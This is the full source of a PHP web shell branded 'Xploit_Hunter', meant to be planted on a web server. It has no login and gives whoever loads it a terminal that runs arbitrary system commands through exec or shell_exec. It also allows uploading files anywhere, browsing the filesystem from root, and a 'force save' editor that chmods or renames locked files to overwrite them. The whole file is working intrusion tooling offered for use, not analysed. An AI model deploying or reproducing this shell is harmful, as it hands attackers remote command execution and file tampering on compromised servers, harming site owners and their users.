<?php
/**
 * --- Xploit_Hunter: Ultra Force Edition ---
 **/
error_reporting(0);
session_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

// --- CONFIG ---
$title = "Xploit_Hunter";
$theme_bg = "#0a0a0f";
$theme_fg = "#00ffe7";
$theme_border = "#8000ff";

// --- FUNCTIONS ---
function exe($cmd) {
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    }
    return "Disabled";
}

function perms($file){
    $perms = @fileperms($file);
    if ($perms === false) return '????';
    return (($perms & 0x0100) ? 'r' : '-').(($perms & 0x0080) ? 'w' : '-').(($perms & 0x0040) ? 'x' : '-');
}

function redirect($msg_type, $msg_text, $p) {
    header("Location: ?" . http_build_query(['path' => $p, 'msg_type' => $msg_type, 'msg_text' => $msg_text]));
    exit();
}

// --- SETUP ---
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\','/',$path);

// --- HANDLERS ---
if(isset($_FILES['f_up'])){
    if(copy($_FILES['f_up']['tmp_name'], $path.'/'.basename($_FILES['f_up']['name']))){
        redirect('success', 'UPLOAD DONE', $path);
    } else {
        redirect('error', 'UPLOAD FAILED', $path);
    }
}

if(isset($_POST['opt_action']) && $_POST['opt_action'] == 'edit_save'){
    $target = $_POST['path_target'];
    $content = $_POST['src_content'];
    
    // Step 1: Normal Write
    @chmod($target, 0666);
    if(@file_put_contents($target, $content) !== false){
        redirect('success', 'SAVE DONE', $path);
    } 

    // Step 2: Force Move-Bypass (Delete/Recreate)
    $tmp = $target . '.old_' . time();
    if(@rename($target, $tmp)){
        if(@file_put_contents($target, $content) !== false){
            @unlink($tmp);
            redirect('success', 'FORCE SAVE DONE', $path);
        } else {
            @rename($tmp, $target); // Restore if failed
            redirect('error', 'STILL LOCKED BY SYSTEM', $path);
        }
    } else {
        redirect('error', 'PERMISSION DENIED', $path);
    }
}

if(isset($_POST['new_item'])){
    $name = $path.'/'.basename($_POST['item_name']);
    if($_POST['type'] == 'file') file_put_contents($name, '');
    else mkdir($name);
    redirect('success', 'CREATED', $path);
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<title><?php echo $title; ?></title>
<style>
  body { background: #0f0f23; color: #00ffe7; font-family: 'Share Tech Mono', monospace; margin: 0; }
  h1 { color: #ff2bd4; text-align: center; text-shadow: 0 0 10px #ff2bd4; }
  a { color: #00b7ff; text-decoration: none; }
  table { width: 95%; margin: 20px auto; border-collapse: collapse; background: #1a1a2e; border: 1px solid #8000ff; }
  th, td { border: 1px solid #8000ff; padding: 10px; }
  .menu { text-align: center; padding: 15px; border-bottom: 2px solid #8000ff; background: #11112b; }
  .menu a { margin: 0 10px; font-weight: bold; font-size: 14px; }
  .box { border: 2px solid #8000ff; padding: 15px; margin: 20px auto; width: 90%; background: #1a1a2e; }
  input, textarea, select { background: #000; color: #00ffe7; border: 1px solid #8000ff; padding: 8px; font-family: inherit; }
  input[type="submit"] { background: #ff2bd4; color: #000; font-weight: bold; cursor: pointer; }
  .msg { text-align: center; padding: 10px; font-weight: bold; }
  .success { color: #39FF14; } .error { color: #FF0033; }
</style>
</head>
<body>
    <div style="text-align:center; padding:10px;">
        <img src="https://raw.githubusercontent.com/xploithunter59-sudo/Xploit_Hunter/main/Xploit_Hunter.png" width="120" style="border-radius:15px; border:2px solid #ff2bd4;">
        <h1><?php echo $title; ?></h1>
    </div>

<?php if($_GET['msg_text']) echo "<div class='msg ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; ?>

<div class="menu">
    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">TERMINAL</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=upload">UPLOAD</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=search">SEARCH</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=create">CREATE</a> |
    <a href="?path=<?php echo urlencode($path); ?>">HOME</a>
</div>

<div style="padding:10px; text-align:center;">
    DIR: <?php 
    $parts = explode('/', trim($path, '/'));
    echo '<a href="?path=/">/</a>';
    $acc = '';
    foreach($parts as $p){ $acc .= '/'.$p; echo '<a href="?path='.urlencode($acc).'">'.htmlspecialchars($p).'</a>/'; }
    ?>
</div>

<?php
$act = $_GET['action'];
if ($act) {
    echo '<div class="box">';
    if($act == 'cmd'){
        echo '<form method="POST"><input type="text" name="c" style="width:80%"><input type="submit" value="EXE"></form>';
        if($_POST['c']) echo '<pre style="background:#000;color:#0f0;padding:10px;">'.htmlspecialchars(exe($_POST['c'])).'</pre>';
    } elseif($act == 'upload'){
        echo '<form enctype="multipart/form-data" method="POST"><input type="file" name="f_up"><input type="submit" value="UPLOAD"></form>';
    } elseif($act == 'search'){
        echo '<form method="POST">Find Name: <input type="text" name="sk"><input type="submit" value="GO"></form>';
    } elseif($act == 'create'){
        echo '<form method="POST"><select name="type"><option>file</option><option>dir</option></select><input type="text" name="item_name"><input type="submit" name="new_item" value="OK"></form>';
    } elseif($act == 'edit'){
        $f = $_GET['file'];
        echo "<h3>Editing: ".basename($f)."</h3>";
        echo '<form method="POST"><textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars(@file_get_contents($f)).'</textarea>';
        echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($f).'">';
        echo '<input type="hidden" name="opt_action" value="edit_save">';
        echo '<br><input type="submit" value="FORCE SAVE"></form>';
    }
    echo '</div>';
}

if (!$act || $act == 'search') {
    echo '<table><tr style="background:#11112b;color:#ff2bd4;"><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
    $items = scandir($path);
    foreach ($items as $i) {
        if ($i == '.' || $i == '..') continue;
        if ($_POST['sk'] && strpos(strtolower($i), strtolower($_POST['sk'])) === false) continue;
        $full = $path . '/' . $i;
        echo "<tr><td><a href='?path=".urlencode($full)."'>$i</a></td>";
        echo "<td>".(is_dir($full)?'DIR':round(filesize($full)/1024,2).'KB')."</td>";
        echo "<td>".perms($full)."</td>";
        echo "<td><a href='?action=edit&file=".urlencode($full)."&path=".urlencode($path)."'>Edit</a></td></tr>";
    }
    echo '</table>';
}
?>
</body>
</html>
